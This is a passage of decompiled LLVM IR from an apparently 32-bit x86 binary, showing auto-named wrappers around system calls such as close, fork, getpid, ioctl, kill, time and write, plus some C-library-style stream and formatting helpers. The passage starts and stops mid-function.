  uselistorder i32* %eax.global-to-local, { 0, 17, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 11, 14, 15, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 39, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38 }
  uselistorder i32 ()* @function_804d6ac, { 2, 1, 0 }
  uselistorder i32 -24, { 2, 0, 1 }
  uselistorder i32 -20, { 2, 0, 1 }
  uselistorder i32 (i32)* @function_804d0f8, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_804cfc4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_804d228, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_804e3b8, { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804ad5a, { 1, 0 }
  uselistorder label %dec_label_pc_804ace8, { 1, 0 }
  uselistorder label %dec_label_pc_804ac6b, { 1, 0 }
  uselistorder label %dec_label_pc_804ab66.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804aba3, { 1, 0 }
}

define i32 @function_804b2bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_804b2bc:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b2bc = load i32, i32* @edi, align 4
  store i32 %v0_804b2bc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804b2c4 = load i32, i32* @ebx, align 4
  %v1_804b2cc = call i32 @close(i32 %arg1)
  store i32 %v0_804b2c4, i32* @ebx, align 4
  store i32 %v1_804b2cc, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804b2cc, -4095
  br i1 %tmp8, label %dec_label_pc_804b2e4, label %dec_label_pc_804b2d8

dec_label_pc_804b2d8:                             ; preds = %dec_label_pc_804b2bc
  %v1_804b2d8 = call i32 @function_804b4bc(i32 %v0_804b2c4)
  %v0_804b2dd = load i32, i32* %edi.global-to-local, align 4
  %v1_804b2dd = sub i32 0, %v0_804b2dd
  %v2_804b2df = inttoptr i32 %v1_804b2d8 to i32*
  store i32 %v1_804b2dd, i32* %v2_804b2df, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804b2e4

dec_label_pc_804b2e4:                             ; preds = %dec_label_pc_804b2bc, %dec_label_pc_804b2d8
  %v0_804b2e4 = phi i32 [ %v1_804b2cc, %dec_label_pc_804b2bc ], [ -1, %dec_label_pc_804b2d8 ]
  %v2_804b2e8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b2e8, i32* @edi, align 4
  ret i32 %v0_804b2e4

; uselistorder directives
  uselistorder i32 %v1_804b2cc, { 1, 0, 2 }
  uselistorder i32 %v0_804b2c4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b2e4, { 1, 0 }
}

define i32 @function_804b2ec() local_unnamed_addr {
dec_label_pc_804b2ec:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b2ec = load i32, i32* @ebx, align 4
  store i32 %v0_804b2ec, i32* %stack_var_-4, align 4
  %v1_804b2f5 = call i32 @fork(i32 %v0_804b2ec)
  store i32 %v1_804b2f5, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804b2f5, -4095
  br i1 %tmp6, label %dec_label_pc_804b30c, label %dec_label_pc_804b300

dec_label_pc_804b300:                             ; preds = %dec_label_pc_804b2ec
  %v0_804b300 = load i32, i32* %stack_var_-4, align 4
  %v1_804b300 = call i32 @function_804b4bc(i32 %v0_804b300)
  %v0_804b305 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b305 = sub i32 0, %v0_804b305
  %v2_804b307 = inttoptr i32 %v1_804b300 to i32*
  store i32 %v1_804b305, i32* %v2_804b307, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b30c

dec_label_pc_804b30c:                             ; preds = %dec_label_pc_804b2ec, %dec_label_pc_804b300
  %v0_804b30c = phi i32 [ %v1_804b2f5, %dec_label_pc_804b2ec ], [ -1, %dec_label_pc_804b300 ]
  %v2_804b310 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b310, i32* @ebx, align 4
  ret i32 %v0_804b30c

; uselistorder directives
  uselistorder i32 %v1_804b2f5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b30c, { 1, 0 }
}

define i32 @function_804b314() local_unnamed_addr {
dec_label_pc_804b314:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b314 = load i32, i32* @ebx, align 4
  store i32 %v0_804b314, i32* %stack_var_-4, align 4
  %v1_804b31d = call i32 @getpid(i32 %v0_804b314)
  store i32 %v1_804b31d, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804b31d, -4095
  br i1 %tmp6, label %dec_label_pc_804b334, label %dec_label_pc_804b328

dec_label_pc_804b328:                             ; preds = %dec_label_pc_804b314
  %v0_804b328 = load i32, i32* %stack_var_-4, align 4
  %v1_804b328 = call i32 @function_804b4bc(i32 %v0_804b328)
  %v0_804b32d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b32d = sub i32 0, %v0_804b32d
  %v2_804b32f = inttoptr i32 %v1_804b328 to i32*
  store i32 %v1_804b32d, i32* %v2_804b32f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b334

dec_label_pc_804b334:                             ; preds = %dec_label_pc_804b314, %dec_label_pc_804b328
  %v0_804b334 = phi i32 [ %v1_804b31d, %dec_label_pc_804b314 ], [ -1, %dec_label_pc_804b328 ]
  %v2_804b338 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b338, i32* @ebx, align 4
  ret i32 %v0_804b334

; uselistorder directives
  uselistorder i32 %v1_804b31d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b334, { 1, 0 }
}

define i32 @function_804b364(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804b364:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b364 = load i32, i32* @edi, align 4
  store i32 %v0_804b364, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_804b37c = load i32, i32* @ebx, align 4
  %v2_804b384 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v0_804b37c, i32* @ebx, align 4
  store i32 %v2_804b384, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v2_804b384, -4095
  br i1 %tmp11, label %dec_label_pc_804b39c, label %dec_label_pc_804b390

dec_label_pc_804b390:                             ; preds = %dec_label_pc_804b364
  %v1_804b390 = call i32 @function_804b4bc(i32 %v0_804b37c)
  %v0_804b395 = load i32, i32* %edi.global-to-local, align 4
  %v1_804b395 = sub i32 0, %v0_804b395
  %v2_804b397 = inttoptr i32 %v1_804b390 to i32*
  store i32 %v1_804b395, i32* %v2_804b397, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804b39c

dec_label_pc_804b39c:                             ; preds = %dec_label_pc_804b364, %dec_label_pc_804b390
  %v0_804b39c = phi i32 [ %v2_804b384, %dec_label_pc_804b364 ], [ -1, %dec_label_pc_804b390 ]
  %v2_804b3a1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b3a1, i32* @edi, align 4
  ret i32 %v0_804b39c

; uselistorder directives
  uselistorder i32 %v2_804b384, { 1, 0, 2 }
  uselistorder i32 %v0_804b37c, { 1, 0 }
  uselistorder label %dec_label_pc_804b39c, { 1, 0 }
}

define i32 @function_804b3a4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804b3a4:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b3a4 = load i32, i32* @ebx, align 4
  store i32 %v0_804b3a4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804b3b7 = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_804b3b7, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_804b3b7, -4095
  br i1 %tmp8, label %dec_label_pc_804b3d0, label %dec_label_pc_804b3c4

dec_label_pc_804b3c4:                             ; preds = %dec_label_pc_804b3a4
  %v0_804b3c4 = load i32, i32* %stack_var_-4, align 4
  %v1_804b3c4 = call i32 @function_804b4bc(i32 %v0_804b3c4)
  %v0_804b3c9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b3c9 = sub i32 0, %v0_804b3c9
  %v2_804b3cb = inttoptr i32 %v1_804b3c4 to i32*
  store i32 %v1_804b3c9, i32* %v2_804b3cb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b3d0

dec_label_pc_804b3d0:                             ; preds = %dec_label_pc_804b3a4, %dec_label_pc_804b3c4
  %v0_804b3d0 = phi i32 [ %v2_804b3b7, %dec_label_pc_804b3a4 ], [ -1, %dec_label_pc_804b3c4 ]
  %v2_804b3d2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804b3d2, i32* @edx, align 4
  %v2_804b3d4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b3d4, i32* @ebx, align 4
  ret i32 %v0_804b3d0

; uselistorder directives
  uselistorder i32 %v2_804b3b7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b3d0, { 1, 0 }
}

define i32 @function_804b3d8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804b3d8:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804b3d9 = load i32, i32* @esi, align 4
  store i32 %v0_804b3d9, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804b3f1 = load i32, i32* @ebx, align 4
  %v1_804b3f9 = call i32 @int80_syscall(i32 142)
  store i32 %v0_804b3f1, i32* @ebx, align 4
  store i32 %v1_804b3f9, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_804b3f9, -4095
  br i1 %tmp11, label %dec_label_pc_804b411, label %dec_label_pc_804b405

dec_label_pc_804b405:                             ; preds = %dec_label_pc_804b3d8
  %v1_804b405 = call i32 @function_804b4bc(i32 %v0_804b3f1)
  %v0_804b40a = load i32, i32* %esi.global-to-local, align 4
  %v1_804b40a = sub i32 0, %v0_804b40a
  %v2_804b40c = inttoptr i32 %v1_804b405 to i32*
  store i32 %v1_804b40a, i32* %v2_804b40c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804b411

dec_label_pc_804b411:                             ; preds = %dec_label_pc_804b3d8, %dec_label_pc_804b405
  %v0_804b411 = phi i32 [ %v1_804b3f9, %dec_label_pc_804b3d8 ], [ -1, %dec_label_pc_804b405 ]
  %v2_804b414 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b414, i32* @esi, align 4
  ret i32 %v0_804b411

; uselistorder directives
  uselistorder i32 %v1_804b3f9, { 1, 0, 2 }
  uselistorder i32 %v0_804b3f1, { 1, 0 }
  uselistorder label %dec_label_pc_804b411, { 1, 0 }
}

define i32 @function_804b418(i32* %arg1) local_unnamed_addr {
dec_label_pc_804b418:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_804b418 = load i32, i32* @edi, align 4
  store i32 %v0_804b418, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_804b420 = load i32, i32* @ebx, align 4
  %v2_804b428 = call i32 @time(i32* %arg1)
  store i32 %v0_804b420, i32* @ebx, align 4
  store i32 %v2_804b428, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_804b428, -4095
  br i1 %tmp9, label %dec_label_pc_804b440, label %dec_label_pc_804b434

dec_label_pc_804b434:                             ; preds = %dec_label_pc_804b418
  %v1_804b434 = call i32 @function_804b4bc(i32 %v0_804b420)
  %v0_804b439 = load i32, i32* %edi.global-to-local, align 4
  %v1_804b439 = sub i32 0, %v0_804b439
  %v2_804b43b = inttoptr i32 %v1_804b434 to i32*
  store i32 %v1_804b439, i32* %v2_804b43b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804b440

dec_label_pc_804b440:                             ; preds = %dec_label_pc_804b418, %dec_label_pc_804b434
  %v0_804b440 = phi i32 [ %v2_804b428, %dec_label_pc_804b418 ], [ -1, %dec_label_pc_804b434 ]
  %v2_804b444 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b444, i32* @edi, align 4
  ret i32 %v0_804b440

; uselistorder directives
  uselistorder i32 %v2_804b428, { 1, 0, 2 }
  uselistorder i32 %v0_804b420, { 1, 0 }
  uselistorder label %dec_label_pc_804b440, { 1, 0 }
}

define i32 @function_804b448(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804b448:
  %v5_804b459 = call i32 @function_804f43c(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* null)
  ret i32 %v5_804b459
}

define i32 @function_804b464(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804b464:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b464 = load i32, i32* @edi, align 4
  store i32 %v0_804b464, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804b474 = load i32, i32* @ebx, align 4
  %v4_804b47c = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804b474, i32* @ebx, align 4
  store i32 %v4_804b47c, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_804b47c, -4095
  br i1 %tmp11, label %dec_label_pc_804b494, label %dec_label_pc_804b488

dec_label_pc_804b488:                             ; preds = %dec_label_pc_804b464
  %v1_804b488 = call i32 @function_804b4bc(i32 %v0_804b474)
  %v0_804b48d = load i32, i32* %edi.global-to-local, align 4
  %v1_804b48d = sub i32 0, %v0_804b48d
  %v2_804b48f = inttoptr i32 %v1_804b488 to i32*
  store i32 %v1_804b48d, i32* %v2_804b48f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804b494

dec_label_pc_804b494:                             ; preds = %dec_label_pc_804b464, %dec_label_pc_804b488
  %v0_804b494 = phi i32 [ %v4_804b47c, %dec_label_pc_804b464 ], [ -1, %dec_label_pc_804b488 ]
  %v2_804b496 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804b496, i32* @edx, align 4
  %v2_804b498 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b498, i32* @edi, align 4
  ret i32 %v0_804b494

; uselistorder directives
  uselistorder i32 %v4_804b47c, { 1, 0, 2 }
  uselistorder i32 %v0_804b474, { 1, 0 }
  uselistorder label %dec_label_pc_804b494, { 1, 0 }
}

define i32 @function_804b49c(i32 %arg1) local_unnamed_addr {
dec_label_pc_804b49c:
  %v1_804b4a0 = add i32 %arg1, 128
  %v6_804b4ab = icmp ugt i32 %v1_804b4a0, 383
  br i1 %v6_804b4ab, label %dec_label_pc_804b4b6, label %dec_label_pc_804b4ad

dec_label_pc_804b4ad:                             ; preds = %dec_label_pc_804b49c
  %v0_804b4ad = load i32, i32* inttoptr (i32 134567812 to i32*), align 4
  %v2_804b4b2 = mul i32 %arg1, 2
  %v3_804b4b2 = add i32 %v0_804b4ad, %v2_804b4b2
  %v4_804b4b2 = inttoptr i32 %v3_804b4b2 to i16*
  %v5_804b4b2 = load i16, i16* %v4_804b4b2, align 2
  %v6_804b4b2 = sext i16 %v5_804b4b2 to i32
  br label %dec_label_pc_804b4b6

dec_label_pc_804b4b6:                             ; preds = %dec_label_pc_804b49c, %dec_label_pc_804b4ad
  %v0_804b4b6 = phi i32 [ %arg1, %dec_label_pc_804b49c ], [ %v6_804b4b2, %dec_label_pc_804b4ad ]
  ret i32 %v0_804b4b6

; uselistorder directives
  uselistorder label %dec_label_pc_804b4b6, { 1, 0 }
}

define i32 @function_804b4bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_804b4bc:
  ret i32 ptrtoint (i32* @global_var_80580c0.106 to i32)
}

define i32 @function_804b4c4(i16* %arg1) local_unnamed_addr {
dec_label_pc_804b4c4:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804b4c4 = load i32, i32* @ebp, align 4
  %v0_804b4c5 = load i32, i32* @edi, align 4
  %v0_804b4c6 = load i32, i32* @esi, align 4
  %v0_804b4c7 = load i32, i32* @ebx, align 4
  %v4_804b4cb = ptrtoint i16* %arg1 to i32
  store i32 %v4_804b4cb, i32* @esi, align 4
  %v1_804b4cf = add i32 %v4_804b4cb, 52
  %v2_804b4cf = inttoptr i32 %v1_804b4cf to i32*
  %v3_804b4cf = load i32, i32* %v2_804b4cf, align 4
  store i32 %v3_804b4cf, i32* @ebp, align 4
  %v1_804b4d2 = icmp eq i32 %v3_804b4cf, 0
  %v1_804b4d4 = icmp eq i1 %v1_804b4d2, false
  br i1 %v1_804b4d4, label %dec_label_pc_804b4f5, label %dec_label_pc_804b4d6

dec_label_pc_804b4d6:                             ; preds = %dec_label_pc_804b4c4
  %v1_804b4d6 = add i32 %v4_804b4cb, 56
  store i32 %v1_804b4d6, i32* @ebx, align 4
  %v2_804b4e0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804b4e0, i32* @eax, align 4
  %v2_804b4e5 = call i32 @function_804ec6e(i32 %v2_804b4e0, i32 134540395)
  %v0_804b4ea = load i32, i32* @ebx, align 4
  %v1_804b4ed = call i32 @function_804ec6b(i32 %v0_804b4ea)
  store i32 %v1_804b4ed, i32* @eax, align 4
  %v0_804b4f7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b4f5

dec_label_pc_804b4f5:                             ; preds = %dec_label_pc_804b4c4, %dec_label_pc_804b4d6
  %v0_804b4ff = phi i32 [ %v4_804b4cb, %dec_label_pc_804b4c4 ], [ %v0_804b4f7.pre, %dec_label_pc_804b4d6 ]
  store i32 0, i32* @edi, align 4
  %v1_804b4f7 = inttoptr i32 %v0_804b4ff to i8*
  %v2_804b4f7 = load i8, i8* %v1_804b4f7, align 1
  %v3_804b4f7 = and i8 %v2_804b4f7, 64
  %v4_804b4f7 = icmp eq i8 %v3_804b4f7, 0
  br i1 %v4_804b4f7, label %dec_label_pc_804b4f5.dec_label_pc_804b50a_crit_edge, label %dec_label_pc_804b4fc

dec_label_pc_804b4f5.dec_label_pc_804b50a_crit_edge: ; preds = %dec_label_pc_804b4f5
  br label %dec_label_pc_804b50a

dec_label_pc_804b4fc:                             ; preds = %dec_label_pc_804b4f5
  %v1_804b500 = inttoptr i32 %v0_804b4ff to i16*
  %v2_804b500 = call i32 @function_804cb18(i16* %v1_804b500)
  store i32 %v2_804b500, i32* @edi, align 4
  %v0_804b50d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b50a

dec_label_pc_804b50a:                             ; preds = %dec_label_pc_804b4f5.dec_label_pc_804b50a_crit_edge, %dec_label_pc_804b4fc
  %v0_804b50d = phi i32 [ %v0_804b4ff, %dec_label_pc_804b4f5.dec_label_pc_804b50a_crit_edge ], [ %v0_804b50d.pre, %dec_label_pc_804b4fc ]
  %v1_804b50d = add i32 %v0_804b50d, 4
  %v2_804b50d = inttoptr i32 %v1_804b50d to i32*
  %v3_804b50d = load i32, i32* %v2_804b50d, align 4
  %v1_804b510 = call i32 @function_804b2bc(i32 %v3_804b50d)
  store i32 %v1_804b510, i32* @eax, align 4
  %v2_804b518 = icmp slt i32 %v1_804b510, 0
  %v1_804b51a = icmp eq i1 %v2_804b518, false
  br i1 %v1_804b51a, label %dec_label_pc_804b51f, label %dec_label_pc_804b51c

dec_label_pc_804b51c:                             ; preds = %dec_label_pc_804b50a
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804b51f

dec_label_pc_804b51f:                             ; preds = %dec_label_pc_804b50a, %dec_label_pc_804b51c
  %v0_804b51f = load i32, i32* @esi, align 4
  %v1_804b51f = add i32 %v0_804b51f, 4
  %v2_804b51f = inttoptr i32 %v1_804b51f to i32*
  store i32 -1, i32* %v2_804b51f, align 4
  %v2_804b531 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804b531, i32* @ebx, align 4
  %v2_804b536 = call i32 @function_804ec6e(i32 %v2_804b531, i32 134540395)
  %v1_804b542 = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_80557b8.107 to i32))
  %v0_804b547 = load i32, i32* @global_var_8055e80.108, align 128
  %v1_804b54c = add i32 %v0_804b547, 1
  store i32 %v1_804b54c, i32* @global_var_8055e80.108, align 128
  store i32 ptrtoint (i32* @global_var_80557b8.107 to i32), i32* @eax, align 4
  %v2_804b557 = call i32 @function_804ec6e(i32 %v2_804b531, i32 1)
  store i32 %v2_804b557, i32* @eax, align 4
  %v0_804b55f = load i32, i32* @esi, align 4
  %v1_804b55f = inttoptr i32 %v0_804b55f to i16*
  %v2_804b55f = load i16, i16* %v1_804b55f, align 2
  %v3_804b55f = and i16 %v2_804b55f, 24576
  store i16 %v3_804b55f, i16* %v1_804b55f, align 2
  %v0_804b564 = load i32, i32* @esi, align 4
  %v1_804b564 = inttoptr i32 %v0_804b564 to i16*
  %v2_804b564 = load i16, i16* %v1_804b564, align 2
  %v3_804b564 = or i16 %v2_804b564, 48
  store i16 %v3_804b564, i16* %v1_804b564, align 2
  br i1 %v1_804b4d4, label %dec_label_pc_804b57d, label %dec_label_pc_804b56c

dec_label_pc_804b56c:                             ; preds = %dec_label_pc_804b51f
  %v2_804b570 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804b570, i32* @eax, align 4
  %v2_804b575 = call i32 @function_804ec6e(i32 %v2_804b570, i32 1)
  store i32 %v2_804b575, i32* @eax, align 4
  br label %dec_label_pc_804b57d

dec_label_pc_804b57d:                             ; preds = %dec_label_pc_804b51f, %dec_label_pc_804b56c
  %v0_804b57d = load i32, i32* @esi, align 4
  %v1_804b57d = add i32 %v0_804b57d, 1
  %v2_804b57d = inttoptr i32 %v1_804b57d to i8*
  %v3_804b57d = load i8, i8* %v2_804b57d, align 1
  %v4_804b57d = and i8 %v3_804b57d, 64
  %v5_804b57d = icmp eq i8 %v4_804b57d, 0
  br i1 %v5_804b57d, label %dec_label_pc_804b591, label %dec_label_pc_804b583

dec_label_pc_804b583:                             ; preds = %dec_label_pc_804b57d
  %v1_804b586 = add i32 %v0_804b57d, 8
  %v2_804b586 = inttoptr i32 %v1_804b586 to i32*
  %v3_804b586 = load i32, i32* %v2_804b586, align 4
  %v1_804b589 = call i32 @function_804e0e5(i32 %v3_804b586)
  store i32 %v1_804b589, i32* @eax, align 4
  br label %dec_label_pc_804b591

dec_label_pc_804b591:                             ; preds = %dec_label_pc_804b57d, %dec_label_pc_804b583
  %v2_804b59d = call i32 @function_804ec6e(i32 %v2_804b531, i32 134540395)
  %v1_804b5a9 = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_80557b8.107 to i32))
  store i32 ptrtoint (i32* @global_var_80557b8.107 to i32), i32* @eax, align 4
  %v0_804b5b0 = load i32, i32* @global_var_8055e84.109, align 4
  %v1_804b5b0 = add i32 %v0_804b5b0, 1
  store i32 %v1_804b5b0, i32* @global_var_8055e84.109, align 4
  %v2_804b5b9 = call i32 @function_804ec6e(i32 %v2_804b531, i32 1)
  %v0_804b5be = call i32 @function_804ca34()
  %v0_804b5c6 = load i32, i32* @edi, align 4
  store i32 %v0_804b4c7, i32* @ebx, align 4
  store i32 %v0_804b4c6, i32* @esi, align 4
  store i32 %v0_804b4c5, i32* @edi, align 4
  store i32 %v0_804b4c4, i32* @ebp, align 4
  ret i32 %v0_804b5c6

; uselistorder directives
  uselistorder label %dec_label_pc_804b591, { 1, 0 }
  uselistorder label %dec_label_pc_804b57d, { 1, 0 }
  uselistorder label %dec_label_pc_804b51f, { 1, 0 }
  uselistorder label %dec_label_pc_804b50a, { 1, 0 }
  uselistorder label %dec_label_pc_804b4f5, { 1, 0 }
}

define i32 @function_804b5d0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804b5d0:
  %v4_804b5df = inttoptr i32 %arg2 to i8*
  %v5_804b5df = call i32 @function_804b990(i32 %arg1, i8* %v4_804b5df, i32 0, i32 -1)
  ret i32 %v5_804b5df
}

define i32 @function_804b5e8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804b5e8:
  %v4_804b5f9 = inttoptr i32 %arg1 to i8*
  %v5_804b5f9 = call i32 @function_804b624(i8* %v4_804b5f9, i32 -1, i32 %arg2, i32 %arg3)
  ret i32 %v5_804b5f9
}

define i32 @function_804b604(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804b604:
  %stack_var_12 = alloca i32, align 4
  %v2_804b607 = ptrtoint i32* %stack_var_12 to i32
  %v4_804b61a = inttoptr i32 %arg1 to i8*
  %v5_804b61a = call i32 @function_804b624(i8* %v4_804b61a, i32 -1, i32 %arg2, i32 %v2_804b607)
  ret i32 %v5_804b61a
}

define i32 @function_804b624(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804b624:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804b624 = load i32, i32* @ebp, align 4
  %v0_804b625 = load i32, i32* @edi, align 4
  %v0_804b626 = load i32, i32* @esi, align 4
  %v0_804b627 = load i32, i32* @ebx, align 4
  store i32 %v0_804b627, i32* %stack_var_-16, align 4
  %v4_804b62b = ptrtoint i8* %arg1 to i32
  store i32 %v4_804b62b, i32* @esi, align 4
  %v2_804b62f = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v2_804b660 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_804b660, i32* @ebp, align 4
  %v1_804b664 = sub i32 -1, %v4_804b62b
  store i32 %v1_804b664, i32* @ebx, align 4
  %v1_804b667 = call i32 @function_804bc21(i32 %v2_804b62f)
  %v0_804b677 = load i32, i32* @ebx, align 4
  %v1_804b677 = load i32, i32* @edi, align 4
  %tmp33 = icmp ugt i32 %v0_804b677, %v1_804b677
  br i1 %tmp33, label %dec_label_pc_804b67b, label %dec_label_pc_804b67d

dec_label_pc_804b67b:                             ; preds = %dec_label_pc_804b624
  store i32 %v1_804b677, i32* @ebx, align 4
  br label %dec_label_pc_804b67d

dec_label_pc_804b67d:                             ; preds = %dec_label_pc_804b624, %dec_label_pc_804b67b
  %v1_804b67d = phi i32 [ %v0_804b677, %dec_label_pc_804b624 ], [ %v1_804b677, %dec_label_pc_804b67b ]
  %v0_804b67d = load i32, i32* @esi, align 4
  %v2_804b67d = add i32 %v0_804b67d, %v1_804b67d
  %v4_804b6a8 = inttoptr i32 %arg3 to i8*
  %v5_804b6a8 = call i32 @function_804bd8c(i32 %v2_804b660, i8* %v4_804b6a8, i32 %arg4, i32 %v2_804b67d)
  store i32 %v5_804b6a8, i32* %edx.global-to-local, align 4
  %v0_804b6b2 = load i32, i32* @ebx, align 4
  %v1_804b6b2 = icmp eq i32 %v0_804b6b2, 0
  br i1 %v1_804b6b2, label %dec_label_pc_804b6cc, label %dec_label_pc_804b6b6

dec_label_pc_804b6b6:                             ; preds = %dec_label_pc_804b67d
  %v16_804b6ba = icmp eq i32 %v1_804b67d, 0
  %v1_804b6be = icmp eq i1 %v16_804b6ba, false
  br i1 %v1_804b6be, label %dec_label_pc_804b6c5, label %dec_label_pc_804b6c0

dec_label_pc_804b6c0:                             ; preds = %dec_label_pc_804b6b6
  %v1_804b6c0 = add i32 %v2_804b67d, -1
  br label %dec_label_pc_804b6c5

dec_label_pc_804b6c5:                             ; preds = %dec_label_pc_804b6b6, %dec_label_pc_804b6c0
  %stack_var_-80.0.in = phi i32 [ %v0_804b67d, %dec_label_pc_804b6b6 ], [ %v1_804b6c0, %dec_label_pc_804b6c0 ]
  %stack_var_-80.0 = inttoptr i32 %stack_var_-80.0.in to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_804b6cf.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804b6cc

dec_label_pc_804b6cc:                             ; preds = %dec_label_pc_804b67d, %dec_label_pc_804b6c5
  %v0_804b6cf = phi i32 [ %v5_804b6a8, %dec_label_pc_804b67d ], [ %v0_804b6cf.pre, %dec_label_pc_804b6c5 ]
  %v2_804b6d1 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804b6d1, i32* @ebx, align 4
  store i32 %v0_804b626, i32* @esi, align 4
  store i32 %v0_804b625, i32* @edi, align 4
